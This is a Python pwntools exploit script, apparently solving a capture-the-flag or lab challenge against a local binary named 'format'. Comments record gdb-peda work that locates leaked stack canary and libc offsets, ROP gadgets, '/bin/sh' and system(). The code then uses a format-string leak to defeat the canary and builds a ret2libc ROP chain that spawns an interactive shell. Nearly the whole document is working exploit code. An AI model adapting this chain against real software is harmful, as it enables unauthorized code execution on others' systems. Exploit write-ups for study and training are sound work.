#!/usr/bin/env python3

from pwn import *

# Some information from gdb after debuggin
# There is a format string vulnerability on the first input
#      Name: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p      

#      Hello 0x7ffc01cb7090 (nil) (nil) 0x4008e0 0x7f8aed4b76a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa20702520 (nil) 0xaa0926ce0e2d4900 0x1 0x7f8aed2d718a 0x7ffc01cb9300 0x400793 0x100400040
#
# gdb-peda$ x/wi 0x7f8aed2d718a
#   0x7f8aed2d718a <__libc_start_call_main+122>: mov    edi,eax
#
# The format string can leak location of
# - stack canary as 15th (%15$p) (0xaa0926....900)
# - main address as 19th (%19$p), however it's not needed because PIE is not enabled (0x400793)
# - libc location as 17th (%17$p)
#
# Using the leak of libc location we can find real location of
# - system address
# - pop rdi gadget address
# - ret gadget address
# - "/bin/sh" address
#
# Let's look for current address of
# gdb-peda$ vmmap
# Start              End                Perm      Name
#....
# 0x00007f8aed2d6000 0x00007f8aed42b000 r-xp      /usr/lib/x86_64-linux-gnu/libc.so.6
#
# Now looking for "pop rdi" gadget 
#gdb-peda$ ropsearch "pop rdi" 0x00007f8aed2d6000 0x00007f8aed42b000
#Searching for ROP gadget: 'pop rdi' in range: 0x7f8aed2d6000 - 0x7f8aed42b000
#0x00007f8aed2d7725 : (b'5fc3')  pop rdi; ret
#0x00007f8aed2d7c97 : (b'5fc3')  pop rdi; ret
#
# Now looking for "ret" gadget (might be useful on ubuntu distro)
#gdb-peda$ ropsearch "ret" 0x00007f8aed2d6000 0x00007f8aed42b000
#Searching for ROP gadget: 'ret' in range: 0x7f8aed2d6000 - 0x7f8aed42b000
# 0x00007f8aed2d75b0 : (b'c3')    ret
#
# Now looking for "bin/sh" string
#gdb-peda$ find "/bin/sh"
#Searching for '/bin/sh' in: None ranges
#Found 1 results, display max 1 items:
#libc.so.6 : 0x7f8aed446031 --> 0x68732f6e69622f ('/bin/sh')
#
# Finally look for system() address:
#gdb-peda$ p system
#$2 = {int (const char *)} 0x7f8aed2fc330 <__libc_system>


# Now that we have all address in this run, we can calculate offset from the libc leak
poprdi_offset = 0x00007f8aed2d7725 - 0x7f8aed2d718a
ret_offset = 0x00007f8aed2d75b0 - 0x7f8aed2d718a
binsh_offset = 0x7f8aed446031 - 0x7f8aed2d718a
system_offset = 0x7f8aed2fc330 - 0x7f8aed2d718a

# Let's choose local vs remote
p = process("./format") 

p.recvuntil("Name: ")

payload = b'%15$p%17$p'

p.sendline(payload)

p.recvuntil("Hello ")
leak=p.recvline()
leak_cookie=int(leak[:18],16)
leak_libc=int(leak[18:],16)
log.info('cookie is at: {}'.format(hex(leak_cookie)))
log.info('libc is at: {}'.format(hex(leak_libc)))

system_addr = leak_libc + system_offset
binsh_addr = leak_libc + binsh_offset
poprdi_addr = leak_libc + poprdi_offset
ret_addr = leak_libc + ret_offset

log.info('system is at: {}'.format(hex(system_addr)))
log.info('binsh is at: {}'.format(hex(binsh_addr)))
log.info('ret is at: {}'.format(hex(ret_addr)))
log.info('pop rdi is at: {}'.format(hex(poprdi_addr)))

payload = b'A'*136
payload += p64(leak_cookie)
payload += b'BBBBBBBB'
payload += p64(poprdi_addr)
payload += p64(binsh_addr)
payload += p64(ret_addr)
payload += p64(system_addr)

output = p.recvuntil("Code: ")

log.info('{}'.format(output))

p.sendline(payload)
p.interactive()

